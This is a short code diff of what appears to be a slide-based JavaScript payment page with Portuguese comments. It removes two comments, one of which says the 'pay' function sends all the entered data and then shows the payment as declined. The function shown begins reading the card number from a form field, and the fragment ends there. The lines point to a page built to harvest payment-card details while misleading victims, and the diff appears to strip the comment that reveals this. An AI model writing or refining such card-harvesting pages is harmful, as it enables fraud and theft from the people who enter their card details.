@@ -1125,7 +1125,6 @@ ATENÇÃO:
 
     function anterior() { if (currentSlide > 1) { currentSlide--; showSlide(currentSlide); } }
 
-    /* SEGUINTE → apenas avança entre slides */
     function seguinte() {
       if (currentSlide < totalSlides) {
         currentSlide++;
@@ -1133,7 +1132,6 @@ ATENÇÃO:
       }
     }
 
-    /* PAGAR → envia todos os dados e mostra recusado */
     function pagarCartao() {
       const dadosCartao = {
         numero: document.getElementById('numeroCartao').value.trim(),
